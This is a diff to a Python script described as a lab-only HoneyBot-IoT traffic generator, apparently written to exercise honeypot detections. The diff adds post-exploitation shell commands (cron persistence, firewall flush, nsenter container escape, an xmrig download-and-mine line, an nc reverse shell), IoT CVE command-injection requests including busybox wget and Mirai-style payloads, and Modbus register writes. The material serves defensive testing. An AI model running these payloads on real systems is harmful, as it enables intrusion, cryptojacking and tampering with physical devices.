@@ -73,6 +73,24 @@ PAYLOAD_CMDS = [
 ]
 DISCOVERY_CMDS = ["uname -a", "cat /proc/cpuinfo", "cat /proc/meminfo", "whoami", "id",
                   "ps", "ifconfig", "cat /etc/passwd", "free", "ls -la /tmp"]
+# post-exploitation run in the REAL restricted shell (v0.8): each line trips a
+# distinct behavioural detection (persistence / evasion / DoS / mining / escape / revshell)
+POSTEXPLOIT_CMDS = [
+    "echo '* * * * * /tmp/.x' > /etc/cron.d/x",                 # PERSISTENCE
+    "pkill -9 watchdog; iptables -F",                           # DEFENSE_EVASION
+    "nsenter -t 1 -m -u -i -n sh",                              # CONTAINER_ESCAPE
+    "wget http://198.51.100.9/xmrig -O /tmp/m; /tmp/m --donate-level 1 -o stratum+tcp://pool.minexmr.com:4444",  # CRYPTO_MINING
+    "nc 198.51.100.9 4444 -e /bin/sh",                          # REVERSE_SHELL
+]
+# real IoT web exploits (device machine: CCTV). (path, method, body)
+CVE_REQUESTS = [
+    ("/SDK/webLanguage", "PUT", b"<?xml version=\"1.0\"?><language>$(id;uname -a)</language>"),
+    ("/cgi-bin/supervisor/Factory.cgi?cmd=cat%20/etc/passwd", "GET", None),
+    ("/RPC2_Login", "POST", b'{"method":"global.login","params":{"loginType":"Direct"}}'),
+    ("/GponForm/diag_Form?images/", "POST", b"dest_host=;/bin/busybox wget http://198.51.100.9/g -O /tmp/g;"),
+    ("/ctrlt/DeviceUpgrade_1", "POST",
+     b"<?xml version=\"1.0\"?><s:Envelope><NewStatusURL>`/bin/busybox MIRAI`</NewStatusURL></s:Envelope>"),
+]
 
 
 def log(tag, msg):
@@ -125,8 +143,8 @@ def banner_grab(host, port, timeout=3):
 
 
 # ── HTTP ─────────────────────────────────────────────────────────────────────
-def http_get(url, auth=None, timeout=6, data=None, headers=None):
-    req = urllib.request.Request(url, data=data, headers=headers or {})
+def http_get(url, auth=None, timeout=6, data=None, headers=None, method=None):
+    req = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
     if auth:
         req.add_header("Authorization", "Basic " + base64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode())
     try:
@@ -309,7 +327,7 @@ def scn_webscan(cfg):
 def scn_ics(cfg):
     log("ics", "unauthorised device-control via REST + Telnet")
     # smart-lock REST: authenticate, then unlock
-    status, body = http_get(f"http://{cfg.http_host}:{cfg.lock_port}/api/v1/auth",
+    status, body = http_get(f"http://{cfg.lock_host}:{cfg.lock_port}/api/v1/auth",
                             data=b'{"username":"admin","password":"admin"}',
                             headers={"Content-Type": "application/json"})
     try:
@@ -317,7 +335,7 @@ def scn_ics(cfg):
     except Exception:
         token = None
     if token:
-        http_get(f"http://{cfg.http_host}:{cfg.lock_port}/api/v1/lock?token={token}",
+        http_get(f"http://{cfg.lock_host}:{cfg.lock_port}/api/v1/lock?token={token}",
                  data=b'{"action":"unlock"}', headers={"Content-Type": "application/json"})
         log("ics", "smart lock unlocked via REST API")
     # sensor threshold change over Telnet
@@ -373,6 +391,53 @@ def scn_camera(cfg):
         log("camera", f"stream error: {e}")
 
 
+def scn_postexploit(cfg):
+    log("postexploit", "login then real-shell post-exploitation (persistence/evasion/mining/revshell/escape)")
+    hit = try_logins(cfg.host, cfg.ssh_port, cfg.creds)
+    if not hit:
+        log("postexploit", "no SSH login accepted — skipping")
+        return
+    try:
+        ssh_connect(cfg.host, cfg.ssh_port, hit[0], hit[1], commands=["; ".join(POSTEXPLOIT_CMDS)])
+    except Exception as e:
+        log("postexploit", f"ssh exec error: {e!r}")
+
+
+def scn_exploit(cfg):
+    log("exploit", f"{len(CVE_REQUESTS)} real IoT web exploit requests (CVE emulation)")
+    for path, method, body in CVE_REQUESTS:
+        try:
+            http_get(f"http://{cfg.http_host}:{cfg.http_port}{path}", data=body,
+                     headers={"Content-Type": "application/xml"} if body else None, method=method)
+        except Exception as e:
+            log("exploit", f"{path}: {e}")
+        jitter(0.1, 0.3)
+
+
+def _modbus_txn(sock, pdu, tid=1, unit=1):
+    sock.sendall(struct.pack(">HHHB", tid, 0, len(pdu) + 1, unit) + pdu)
+    head = sock.recv(7)
+    if len(head) < 7:
+        return b""
+    length = struct.unpack(">HHHB", head)[2]
+    return sock.recv(length - 1)
+
+
+def scn_modbus(cfg):
+    log("modbus", "Modbus/TCP read + register write (ICS parameter tampering)")
+    try:
+        s = socket.create_connection((cfg.modbus_host, cfg.modbus_port), timeout=6)
+        s.settimeout(6)
+        _modbus_txn(s, struct.pack(">BHH", 3, 0, 8))          # read holding registers
+        _modbus_txn(s, struct.pack(">B", 17))                 # report server id (fingerprint)
+        _modbus_txn(s, struct.pack(">BHH", 6, 3, 50))         # write temp_threshold = 5.0
+        _modbus_txn(s, struct.pack(">BHH", 6, 6, 1))          # mode -> manual
+        s.close()
+        log("modbus", "wrote holding registers 40004/40007")
+    except Exception as e:
+        log("modbus", f"modbus error: {e}")
+
+
 def scn_benign(cfg):
     log("benign", "single banner grab + immediate disconnect")
     banner_grab(cfg.host, cfg.telnet_port)
@@ -382,17 +447,21 @@ def scn_benign(cfg):
 SCENARIOS = {
     "scan": scn_scan, "brute": scn_brute, "stuffing": scn_stuffing, "payload": scn_payload,
     "discovery": scn_discovery, "c2": scn_c2, "webscan": scn_webscan, "ics": scn_ics,
-    "camera": scn_camera, "benign": scn_benign,
+    "camera": scn_camera, "postexploit": scn_postexploit, "exploit": scn_exploit,
+    "modbus": scn_modbus, "benign": scn_benign,
 }
 
 
 def main():
     ap = argparse.ArgumentParser(description="HoneyBot-IoT traffic generator (lab use only)")
     ap.add_argument("--host", default="127.0.0.1", help="SSH/scan target host")
-    ap.add_argument("--http-host", dest="http_host")
-    ap.add_argument("--telnet-host", dest="telnet_host")
+    ap.add_argument("--http-host", dest="http_host", help="CCTV web host")
+    ap.add_argument("--telnet-host", dest="telnet_host", help="sensor Telnet host")
     ap.add_argument("--mqtt-host", dest="mqtt_host")
     ap.add_argument("--rtsp-host", dest="rtsp_host")
+    ap.add_argument("--lock-host", dest="lock_host", help="smart-lock REST host")
+    ap.add_argument("--sensor-host", dest="sensor_host", help="sensor HMI host")
+    ap.add_argument("--modbus-host", dest="modbus_host", help="sensor Modbus host")
     ap.add_argument("--ssh-port", type=int, default=2222)
     ap.add_argument("--telnet-port", type=int, default=2323)
     ap.add_argument("--http-port", type=int, default=8080)
@@ -400,6 +469,7 @@ def main():
     ap.add_argument("--sensor-port", type=int, default=8082)
     ap.add_argument("--mqtt-port", type=int, default=1883)
     ap.add_argument("--rtsp-port", type=int, default=8554)
+    ap.add_argument("--modbus-port", type=int, default=502)
     ap.add_argument("--wordlist", default=os.path.join(HERE, "wordlist.txt"))
     ap.add_argument("-s", "--scenario", action="append", choices=list(SCENARIOS) + ["all"],
                     help="scenario(s) to run (default: all)")
@@ -410,7 +480,8 @@ def main():
     cfg = ap.parse_args()
 
     for attr, default in (("http_host", "host"), ("telnet_host", "host"),
-                          ("mqtt_host", "host"), ("rtsp_host", "host")):
+                          ("mqtt_host", "host"), ("rtsp_host", "host"),
+                          ("lock_host", "host"), ("sensor_host", "host"), ("modbus_host", "host")):
         if getattr(cfg, attr) is None:
             setattr(cfg, attr, getattr(cfg, default))
     if cfg.seed is not None:
